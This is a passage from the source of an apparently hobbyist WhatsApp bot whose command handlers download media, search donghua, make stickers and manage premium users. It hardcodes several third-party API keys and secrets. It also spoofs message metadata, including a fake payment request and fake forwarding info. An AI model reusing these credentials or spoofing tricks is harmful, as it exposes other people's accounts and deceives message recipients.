                            description: `click to see detail "${donghua.title}"`,
                            id: `.detaildonghua ${updatedUrl}`
                        },
                        {
                            title: 'WATCH NOW',
                            description: `click to watch "${donghua.title}"`,
                            id: `.streamingdonghua ${updatedUrl}`
                        }
                    ]
                };
            });

            let listMessage = {
                title: 'TAP HERE',
                sections
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363232588171807@newsletter',
                                    newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
                                    serverMessageId: -1
                                },
                                businessMessageForwardInfo: { businessOwnerJid: Al.decodeJid(Al.user.id) },
                                forwardingScore: 256,
                                externalAdReply: {
                                    title: 'ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙',
                                    thumbnailUrl: json.data[0].thumbnail, // gunakan thumbnail dari film pertama
                                    sourceUrl: json.data[0].url.replace('https://tv1.ichinime.net', 'https://tv1.ichinime.net'), // gunakan URL dari film pertama
                                    mediaType: 2,
                                    renderLargerThumbnail: false
                                }
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `Your search was successful! Select a search result from the menu below`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "© 𝐌𝐚𝐧𝐮 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                subtitle: "Hasil_Pencarian",
                                hasMediaAttachment: false//,
                                //...(await prepareWAMessageMedia({ image: { url: json.data[0].thumbnail } }, { upload: LorenzoBotInc.waUploadToServer }))
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify(listMessage)
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { quoted: m });

            Al.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        } else {
            m.reply('Donghua not found');
        }
    } catch (error) {
        console.error(error);
        m.reply('error');
    }
 }
break
case 'detaildonghua': {
if (!/https?:\/\/(www\.)?tv1.ichinime\.net/i.test(args[0])) return m.reply(`Example : ${prefix + command} url`)
try {
let res = await fetchJson(`https://api.alyachan.dev/api/donghua-get?url=${args[0]}&type=detail&apikey=APIKEYKAMU`)
if (res.status && res.data) {
let hasil = res.data
let teks = `
Title: *${hasil.title}*

Type: ${hasil.type}
Release Date: ${hasil.release}
Genre: ${hasil.genre}
Duration: ${hasil.duration}
Studio: ${hasil.studio}
Season: ${hasil.season}

Description: ${hasil.sinopsis}`
await Al.sendMessage(m.chat, {
text: teks,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
title: "Donghua-Detail",
thumbnailUrl: hasil.thumbnail,
sourceUrl: `${text}`,
mediaType: 1,
renderLargerThumbnail: true
}}
},{
quoted: m
})
}
console.log(res)
} catch (err) {
console.log(err)
m.reply('error')
}
}
break
case 'streamingdonghua': {
    if (!text) return m.reply(`Example : ${prefix + command} url`);
    try {
        let res = await fetch(`https://api.alyachan.dev/api/donghua-get?url=${args[0]}&type=detail&apikey=APIKEYKAMU`);
        let result = await res.json();
        if (result.status && result.data && result.data.episodes.length > 0) {
            let episodes = result.data.episodes;

            let episodeButtons = episodes.map((episode) => ({
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `Streaming Episode ${episode.episode} (${episode.title})`,
                    url: episode.url,
                    merchant_url: episode.url
                })
            }));

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363287688699869@newsletter',
                                    newsletterName: 'Donghua search result',
                                    serverMessageId: -1
                                },
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: 'Here are your donghua streaming results. Select the episode you want to watch:'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "© 𝐌𝐚𝐧𝐮 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `Hello *@${m.sender.split('@')[0]}* ðŸ‘‹`,
                                subtitle: "ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: episodeButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            Al.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            m.reply('No episode found');
        }
    } catch (err) {
        console.log(err);
        m.reply('error');
    }
}
break
case'mediafire': case'mfire': case'mfdl':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*`)
if (!isUrl(text)) return m.reply('Link yang kamu berikan tidak valid')
if (!text.includes('mediafire.com')) return m.reply('Link yang kamu berikan tidak valid')
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
kotz.mediafire(text).then(async(data) => {
data = data[0]
data.nama = decodeURIComponent(data.nama)
var media = await getBuffer(data.link)
if (data.mime.includes('mp4')) {
Al.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'video/mp4' }, { quoted: m })
} else if (data.mime.includes('mp3')) {
Al.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
Al.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'application/'+data.mime }, { quoted: m })
}
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
m.reply('Yah,ada kesalahan kak segera hubungi owner ya agar di perbaiki')
})}
limitAdd(m.sender, limit)
break
case 'gitclone':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://github.com/AiBotzzpin/kmmy-md`)
if (!regx.test(text)) return m.reply('Linknya salah')
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
let [, usr, repo] = text.match(regx) || []
let repos = repo.replace(/.git$/, '')
let hasdl = `https://api.github.com/repos/${usr}/${repos}/zipball`
let namafile = (await fetch(hasdl, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
Al.sendMessage(m.chat, { document: { url: hasdl }, mimetype: 'application/zip', fileName: namafile }, { quoted: m })
}
limitAdd(m.sender, limit)
break
case 'tiktokaudio': case 'ttmp3': case'tiktokmp3':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
const ttmp3nya = {url:data.audio}
Al.sendMessage(m.chat, { audio: ttmp3nya, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
limitAdd(m.sender, limit)
break
case'ttslide': case 'tiktokslide':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
try{
let anu = await fetchJson(`https://widipe.com/download/tiktokslide?url=${text}`)
await Al.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await Al.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
limitAdd(m.sender, limit)
break
case 'instagram': case 'ig':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Masukan Link Nya!!!`)
if (!isUrl(args[0])) return m.reply(`Apakah Itu Terlihat Seperti Link?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})
try{   
let anu = await fetchJson(`https://widipe.com/download/igdl?url=${text}`)
Al.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `𝗠𝗔𝗡𝗨-𝗠𝗗` }, { quoted: m })
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await Al.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
limitAdd(m.sender, limit)
break
case 'ytdl1': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Masukan Link Nya!!!`)
if (!isUrl(args[0])) return m.reply(`Apakah Itu Terlihat Seperti Link?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})
try{   
let anu = await fetchJson(`https://widipe.com/youtube?url=${text}`)
Al.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `_Sukses Mengunduh Video_` }, { quoted: m })
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await Al.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
limitAdd(m.sender, limit)
break
//=================
case 'allmedia': case 'all':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Masukan Link Nya!!!`)
if (!isUrl(args[0])) return m.reply(`Apakah Itu Terlihat Seperti Link?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})
try{   
let anu = await fetchJson(`https://itzpire.com/download/aio?url=${text}`)
Al.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `_Sukses Mengunduh Video_` }, { quoted: m })
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await Al.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
limitAdd(m.sender, limit)
break
//=================
case 'whatmusic':{
let acr = new acrcloud({

host: 'identify-eu-west-1.acrcloud.com',

access_key: 'f692756eebf6326010ab8694246d80e7',

access_secret: 'm2KQYmHdBCthmD7sOTtBExB9089TL7hiAazcUEmb'

})
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (/audio|video/.test(mime)) {
let media = await q.download()
let ext = mime.split('/')[1]
fs.writeFileSync(`./tmp/${m.sender}.${ext}`, media)
let res = await acr.identify(fs.readFileSync(`./tmp/${m.sender}.${ext}`))
let { code, msg } = res.status
if (code !== 0) return m.reply(msg)
let { title, artists, album, genres, release_date } = res.metadata.music[0]
let txt = `

𝚁𝙴𝚂𝚄𝙻𝚃

> • 📌 *TITLE*: ${title}

> • 👨‍🎤 *Artis :* ${artists !== undefined ? artists.map(v => v.name).join(', ') : 'NOT FOUND'}

> • 💾 *Nama :* ${album.name || 'NOT FOUND'}

> • 🌐 *𝙶𝙴𝙽𝙴𝚁 :* ${genres !== undefined ? genres.map(v => v.name).join(', ') : 'NOT FOUND'}

> • 📆 *RELEASE DATE :* ${release_date || 'NOT FOUND'}

`.trim()
fs.unlinkSync(`./tmp/${m.sender}.${ext}`)
m.reply(txt)
} else m.reply('*𝚁𝙴𝚂𝙿𝙾𝙽𝙳 𝙰𝚄𝙳𝙸𝙾*')
}
break
//===============
case 'fb': case 'facebook': 
  if (!text) return m.reply('Enter url facebook');
  try {
    let fb = await (await fetch('https://api.shannmoderz.xyz/downloader/facebook?url=' + text)).json();
    let shannz = fb.result[0];
    await Al.sendMessage(m.chat, { video: { url: shannz.downloadLink }, caption: `Hi *${pushname}* 👋, Join My WhatsApp Channel\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n මගෙ WhatsApp චැනල් එකට Join වෙන්න...🌝💗\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~` },{ quoted: m });
} catch (e) {
    return m.reply('shannz api sending error,' + e);
}
break
case 'listpremium': case'listprem': {
 let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`;
 let men = [];
 for (let i of premium) {
    men.push(i.id);
    // Use optional chaining and nullish coalescing to safely access and split i.id
    let idPart = i.id?.split("@")[0] ?? 'Undefined';
    txt += `*ID :* @${idPart}\n`;
    if (i.expired === 'Permanen') {
      let cekvip = 'Permanen';
      txt += `*Expire :* Permanen\n\n`;
    } else {
      let cekvip = ms(i.expired - Date.now());
      txt += `*Expire :* ${cekvip.days} days, ${cekvip.hours} hours, ${cekvip.minutes} minutes ${cekvip.seconds} seconds\n\n`;
    }
 }
 Al.sendTextWithMentions(m.chat, txt, m);
}
break;
case 'addowner':
if (!isCreator) return m.reply('Khusus Creator')
if (!args[0]) return m.reply(`Nomor WhatsApp Nya Mana`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Al.onWhatsApp(bnnd)
if (ceknye.length == 0) return m.reply(`Enter Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Sukses Menambahkan 1 Owner kedalam List Owner ${namabot}\n*Nomor :* ${bnnd}`)
break
case 'delowner':
if (!isCreator) return m.reply('Khusus Creator')
if (!args[0]) return m.reply(`Owner Yg Mana..?`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Sukses Menghapus 1 List Owner!\n*Nomor :* ${ya}`)
break
case'addprem':{
if (!isCreator) return m.reply('Gamau')
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return m.reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return m.reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
} else {
var cekap = await Al.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return m.reply(`Enter nomer yang valid/terdaftar di WhatsApp`)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
}}
break
case'delprem':
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!args[0]) return m.reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(_prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply('Successfully!')
} else {
var cekpr = await Al.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return m.reply(`Enter nomer yang valid/terdaftar di WhatsApp`)
premium.splice(_prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply('Successfully!')
}
break
case 'motivasi': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let aib = await fetchJson(`https://api.lolhuman.xyz/api/random/katabijak?apikey=${lolkey}`)
let hasil = aib.result
 m.reply(`${hasil}`)
 }
 limitAdd(m.sender, limit)
 break
case 'katabijak': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let aib = await fetch(`https://api.lolhuman.xyz/api/random/katabijak?apikey=${lolkey}`)
let hasil = aib.result
m.reply(`${hasil}`)
 }
 limitAdd(m.sender, limit)
 break
 case 'jarak':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
let [from, to] = text.split(/[^\w\s]/g)
	if (!(from && to)) return m.reply (`Example: ${prefix+command} jakarta|bandung`) 
	let data = await jarak(from, to)
	if (data.img) return Al.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else m.reply(data.desc)
}
limitAdd(m.sender, limit)
break
case 'pantun1': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let aib = await fetch(`https://api.lolhuman.xyz/api/random/pantun?apikey=${lolkey}`)
let hasil = aib.result
m.reply(`${hasil}`)
 }
 limitAdd(m.sender, limit)
 break
case 'quotesdilan':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let jay = await fetch(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolkey}`)
let hasil = jay.result
 m.reply(`${hasil}`)
 }
 limitAdd(m.sender, limit)
 break
        case 'cai': case 'fua':{
        if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`mau nanya apa`)
//if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
const furinabeban = await fetchJson(`https://api.elxyz.me/ai/character-ai?apikey=KC-d25a3f0c02be4021&character=kamu adalah Furina, yang memiliki sifat baik dan sopan, pencipta kamu adalah Wann&text=${encodeURIComponent(text)}`)
Al.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `ᴍᴀɴᴜ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ💙`,body:`⌜ ᴍᴀɴᴜ-ᴍᴅ ⌟`,previewType:"PHOTO",thumbnailUrl: global.thumb,sourceUrl: `${sgc}`,}
}, text: furinabeban}, { quoted: m })
}
limitAdd(m.sender, limit)
break
case 'getcase':
if (!isCreator) return m.reply('Khusus Developer') 
if (!text) return m.reply(`Mau ambil case apa? `)
const getCase = (cases) => {
return "case" + `'${cases}'` + fs.readFileSync("./AiBotzz.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
}
m.reply(`${getCase(q)}`)
break
case 'get':{
if (!isCreator) return m.reply('Special For Owner Features') 
let fetch = require('node-fetch')
let util = require('util')
  if (!/^https?:\/\//.test(text)) return m.reply('Awali *URL* dengan http:// atau https://')
    let _url = new URL(text)
      let res = await fetch(text)
        if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
            delete res
                return m.reply(`Content-Length: ${res.headers.get('content-length')}`)
                  }
                    if (!/text|json/.test(res.headers.get('content-type'))) return Al.sendFile(m.chat, url, null, text, m)
                      let txt = await res.buffer()
                        try {
                            txt = util.format(JSON.parse(txt+''))
                              } catch (e) {
                                  txt = txt + ''
                                    } finally {
                                        m.reply(txt.slice(0, 65536) + '')
                                          }
                                          }
                                          break
//°========°=°°=====
case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!/webp/.test(mime) && /image/.test(mime)) {
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Al.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
let stiker = await sticker5(smeme, false, `Created By ${namabot}`, ``)
if (stiker) return Al.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else {
m.reply(`Kirim/reply image dengan caption ${prefix + command} text1|text2`)
}
}
limitAdd(m.sender, limit)
break 
case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': case 'wm': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
teks1 = text.split('|')[0] ? text.split('|')[0] : ''
teks2 = text.split('|')[1] ? text.split('|')[1] : ''
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
if (/image/.test(mime)) {
let media = await quoted.download()
let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
if (stiker) return Al.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
if (stiker) return Al.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else {
m.reply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
}
}
limitAdd(m.sender, limit)
break
case'smeta': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
//if (!q) return m.reply ( 'Reply a sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                    if (!/webp/.test(mime)) return m.reply('Reply sticker!')
                        //let img = await q.download()
                            let img = await Al.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return m.reply('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `𝐒𝐭𝐢𝐜𝐤𝐞𝐫 𝐀??𝐚𝐭𝐚𝐫 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲 𝐃𝐚𝐟𝐟𝐳©𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥`, `${pushname}`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) Al.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return m.reply('Reply sticker')
                                                                              }
                                                                              }
                                                                              limitAdd(m.sender, limit)
                                                                             
                                                                              break
case 'stiker': case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await Al.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Al.imgToSticker(m.chat, media, m, { packname: `Created By ${namabot}` , author: `` })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await Al.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Al.vidToSticker(m.chat, media, m, { packname: `Created By ${namabot}` , author: `` })
await fs.unlinkSync(media)
} else if (/sticker/.test(mime)) {
let media = await Al.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Al.sendStickerFromUrl(from, media, m, {packname: `Created By ${namabot}` , author: `` })
await fs.unlinkSync(media)
} else m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
}
limitAdd(m.sender, limit)
break
case'limit': case'balance': case'ceklimit': case'cekbalance':{
var limitPrib = `${getLimit(m.sender, limitCount, limit)}`
var quick = (`*Nama :* ${pushname}\n*Status :* ${isCreator ? 'Creator' : 'User'}\n*Limit :* ${isPremium ? '∞' : limitPrib}/∞`)
Al.relayMessage(m.chat,  {
     requestPaymentMessage: {
           currencyCodeIso4217: 'LKR',
                 amount1000: 150000000,
                       requestFrom: m.sender,
                             noteMessage: {
                                   extendedTextMessage: {
                                         text: quick,
                                               contextInfo: {
                                                     externalAdReply: {
                                                           showAdAttribution: true
                                                                 }}}}}}, {})
                                                                 }
                                                                 break
case'qc2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply ('Enter Teks') 
const { quote } = require('./lib/quote') 
try {
let ppnyauser = await await Al.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/72b973058c1985de0eda8.jpg')
const rest = await quote(text, pushname, ppnyauser)
let stiker = await sticker5(rest.result, false, `Created By ${namabot}`)
if (stiker) return Al.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
}catch (error) {
m.reply(`Server sedang error!`);
}
}
limitAdd(m.sender, limit)
break
case 'emojimix': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return m.reply(`Example : ${prefix + command} 😅+💩`)
if (!emoji2) return m.reply(`Example : ${prefix + command} 😅+💩`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Al.sendStickerFromUrl(m.chat, res.url, m, { packname: `Created By ${namabot}` , author: `Owner ${namaowner}`, categories: res.tags })
}
}
limitAdd(m.sender, limit)
break
case 'pucoyo': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`pucoyo`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendImageAsSticker(from, result, m, { packname: global.namabot, author: global.author })
}
limitAdd(m.sender, limit)
break
case 'dino-kuning': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`dino kuning`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendImageAsSticker(from, result, m, { packname: global.namabot, author: global.author })
}
limitAdd(m.sender, limit)
break
case 'jomok': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`jomok`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendImageAsSticker(from, result, m, { packname: global.namabot, author: global.author })
}
limitAdd(m.sender, limit)
break
case 'spongebob': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`SpongeBob SquarePants`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendImageAsSticker(from, result, m, { packname: global.namabot, author: global.author })
}
limitAdd(m.sender, limit)
break
case 'pororo': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
